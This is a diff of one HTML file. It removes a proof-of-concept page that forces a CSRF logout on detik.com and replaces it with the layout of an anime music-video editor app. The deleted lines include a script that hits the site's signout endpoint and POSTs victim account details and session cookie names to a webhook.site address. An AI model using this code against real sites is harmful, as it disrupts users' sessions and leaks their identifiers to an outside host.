@@ -1,49 +1,98 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CSRF Logout PoC - detik.com</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .box { background: #fff; max-width: 500px; margin: 0 auto; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        h2 { color: #c0392b; }
-        .btn { background: #c0392b; color: #fff; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; }
-        .btn:hover { background: #a93226; }
-        pre { background: #1a1a1a; color: #0f0; padding: 15px; text-align: left; border-radius: 5px; font-size: 12px; }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI AMV Auto Editor Generator - Ultra Pro</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://unpkg.com/@ffmpeg/ffmpeg@0.11.6/dist/ffmpeg.min.js"></script>
 </head>
 <body>
-    <div class="box">
-        <h2> PoC: CSRF Logout - detik.com</h2>
-        <p>Klik tombol ini untuk memicu logout paksa dari akun detik.com Anda.</p>
-        <button class="btn" onclick="logout()">Trigger CSRF Logout</button>
-        <p id="status"></p>
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="brand">
+                <h2>AI AMV GENERATOR</h2>
+                <span>Senior Video Engine v1.0</span>
+            </div>
+            
+            <div class="control-group">
+                <h3><span class="icon">📁</span> Media Ingest</h3>
+                <div class="upload-btn-wrapper">
+                    <button class="btn">Upload Anime Video</button>
+                    <input type="file" id="video-upload" accept="video/*" />
+                </div>
+                <div class="upload-btn-wrapper">
+                    <button class="btn">Upload Audio/Music</button>
+                    <input type="file" id="audio-upload" accept="audio/*" />
+                </div>
+            </div>
+
+            <div class="control-group">
+                <h3><span class="icon">🎨</span> Style & Color Grading</h3>
+                <select id="preset-select">
+                    <option value="ice-red">Ice Red (Blue/White/Glow Red)</option>
+                    <option value="cinematic">Anime Cinematic (High Contrast)</option>
+                    <option value="hyper">Hyper AMV (HDR Look/Sharp)</option>
+                </select>
+            </div>
+
+            <div class="control-group">
+                <h3><span class="icon">✨</span> Particle Overlays</h3>
+                <select id="particle-select">
+                    <option value="none">None</option>
+                    <option value="snow">Snow Crystal</option>
+                    <option value="sakura">Sakura Petals</option>
+                    <option value="dust">Glowing Dust</option>
+                </select>
+            </div>
+
+            <div class="control-group">
+                <h3><span class="icon">⚡</span> Engine Controls</h3>
+                <button id="generate-btn" class="btn btn-primary" disabled>Generate AI Edit</button>
+                <button id="export-btn" class="btn btn-success" disabled>Export 720p MP4</button>
+            </div>
+
+            <div class="status-panel">
+                <div id="status-text">System Ready. Please upload assets.</div>
+                <div class="progress-bar"><div id="progress-fill"></div></div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <section class="preview-window">
+                <div class="video-container">
+                    <canvas id="gl-canvas" width="1280" height="720"></canvas>
+                    <div id="playback-overlay"></div>
+                </div>
+                
+                <div class="player-controls">
+                    <button id="play-btn">Play</button>
+                    <button id="pause-btn">Pause</button>
+                    <span id="time-display">00:00 / 00:30</span>
+                </div>
+            </section>
+
+            <section class="timeline-container">
+                <div class="timeline-headers">
+                    <div class="track-label">Audio Wave</div>
+                    <div class="track-label">Beats / FX Track</div>
+                    <div class="track-label">Velocity / Clips</div>
+                </div>
+                <div class="timeline-tracks">
+                    <div class="track" id="wave-track">
+                        <canvas id="wave-canvas"></canvas>
+                    </div>
+                    <div class="track" id="beat-track">
+                        </div>
+                    <div class="track" id="velocity-track"></div>
+                </div>
+            </section>
+        </main>
     </div>
 
-    <script>
-        function logout() {
-            document.getElementById('status').innerHTML = 'Mengirim request logout...';
-            
-            // Kirim CSRF logout
-            var img = new Image();
-            img.src = 'https://connect.detik.com/oauth/signout?' + Date.now();
-            
-            // Kirim bukti ke webhook
-            fetch('https://webhook.site/b66933ac-8fb1-4fc2-997c-5b6cdf43ff03', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    csrf_logout: true,
-                    victim: { username: 'januaul535693', id: 11778423, name: 'LazusHunting' },
-                    session_cleared: ['sessionid','dts-sec','D_ISS','D_RA','D_DC','dc_csrf'],
-                    triggered_from: window.location.href
-                })
-            });
-            
-            setTimeout(function() {
-                document.getElementById('status').innerHTML = '✅ Session dihapus! Cek detik.com - Anda sudah logout.';
-            }, 2000);
-        }
-    </script>
+    <video id="hidden-video" style="display:none;" crossorigin="anonymous"></video>
+    <audio id="hidden-audio" style="display:none;" crossorigin="anonymous"></audio>
+
+    <script src="script.js"></script>
 </body>
 </html>
